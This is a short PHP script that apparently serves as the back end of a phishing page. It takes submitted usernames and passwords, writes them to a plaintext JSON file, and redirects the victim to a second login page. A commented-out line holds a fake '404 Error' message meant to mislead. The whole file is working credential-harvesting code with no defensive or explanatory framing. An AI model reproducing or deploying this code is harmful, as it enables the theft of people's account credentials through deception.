<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$data['dev'][] = array('username' =>$user,
'password'=>$pass);

$jdata = json_encode($data);
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f);

header('Location: ./login3.html');

// echo("\n404 Error .. Server Not found!");


exit();


